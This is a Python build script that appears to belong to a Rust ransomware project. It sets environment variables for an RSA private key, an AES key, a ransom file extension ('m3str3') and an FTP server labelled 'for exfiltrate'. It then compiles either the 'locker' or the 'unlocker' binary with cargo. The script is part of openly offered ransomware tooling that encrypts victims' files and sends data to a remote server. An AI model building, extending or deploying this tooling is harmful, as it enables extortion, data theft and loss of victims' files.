# Easy script for set env vars and compile the `unlocker`
import os
import sys

VAR_RSA = "RSA_PRIV_KEY"
VAR_AES = "AES_KEY_B64"
VAR_FTP = "SERVER_FTP"
VAR_EXT = "RANSOM_EXT"

PRIV_KEY_PATH = "keys/private_key.pem"
dummydata = "iRYwAJlrf+J1/DRa5kdpGpbNTge9YIrgA38hQhJIeXeyYaSJPvhyvUwOZUTpbpHdD6T8XieyMdFrP5COXmU/DY5JMXChrGwOLvKj5VDp9dEWVuVEoA7ZAcBAVs7/qbfPWaFXjGaS78EVP1k6qQr3USUmRCZ8jUVP/FY3zRDD9GoSzR33R6P/9u1SMpo2W3c350/0Fr8W/LBA0c2xfBWovY6S+xmJiPLv+ywySOk27NSUH4yODcFPrvR4P3BHGSrwHykD7Zuypi5bTg6ZfNI3JL2FwzdEJB1Rc7a3j2SlzRw4qiTUWihhG6iFEWc6b0672lBcBDwpufkgXE/R9L03gA=="

DEBUG = False
EXEC = False

def input_with_default(prompt, default):
    valor = input(f"{prompt} [{default}]: ")
    return valor.strip() if valor.strip() else default

if len(sys.argv) > 1:
    release = "" if DEBUG else "--release"
    ejec = "run" if EXEC else "build"

    os.environ[VAR_RSA] = PRIV_KEY_PATH
    if sys.argv[1].startswith("test"):
        os.environ[VAR_AES] = dummydata
        os.system(f"cargo test -- --nocapture")
    else:
        # Ask all time for extension
        os.environ[VAR_EXT] = input_with_default("Ransom extesion for lock/unlock", "m3str3")
        
        if sys.argv[1].startswith("lock"):
            # If locker i need ftp server
            os.environ[VAR_FTP] = input_with_default("The ftp server for exfiltrate -> IP:PORT: ", "127.0.0.1:2121")
            
            # Need a value for build.rs not used 
            # ! RSA priv key is estored for build.rs but not used on the final binary as u can imagine
            os.environ[VAR_AES] = dummydata
            os.system(f"cargo {ejec} {release} --bin locker")

        elif sys.argv[1].startswith("unlock"):
            # RSA priv key
            os.environ[VAR_RSA] = input_with_default("The RSA priv path for decode the AES: ", PRIV_KEY_PATH)
            aes_key_b64 = input("The encrypt AES with RSA in b64 (generated on execute) : ")
            os.environ[VAR_AES] = aes_key_b64  
            os.system(f"cargo {ejec} {release} --bin unlocker")